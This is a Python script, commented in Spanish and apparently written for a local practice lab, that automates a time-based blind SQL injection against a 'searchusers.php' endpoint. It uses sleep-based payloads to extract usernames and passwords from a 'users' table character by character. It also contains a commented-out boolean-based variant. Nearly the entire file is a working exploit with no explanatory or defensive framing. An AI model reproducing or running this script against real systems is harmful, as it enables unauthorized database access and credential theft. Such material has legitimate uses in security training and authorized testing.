#!/usr/bin/env python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    sys.exit(1)

#ctrl+c
signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/searchusers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Datos extraidos")
    datos_extraidos = ""

    for position in range(1,70):
        for char in range(33, 126):

            # sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,':',password) from users),%d,1)) from users where id=1)=%d)" % (position, char)

            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, char)
            p1.status(sqli_url)

            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()

            rest_time = time_end - time_start
            #print(f"El tiempo transcurrid es de: {rest_time}")
            #if r.status_code == 200:
            #    datos_extraidos += chr(char)
            #    p2.status(datos_extraidos)
            #    break

            if rest_time > 0.35:
                datos_extraidos += chr(char)
                p2.status(datos_extraidos)
                break

def main():
    makeSQLI()

if __name__ == '__main__':
    main()
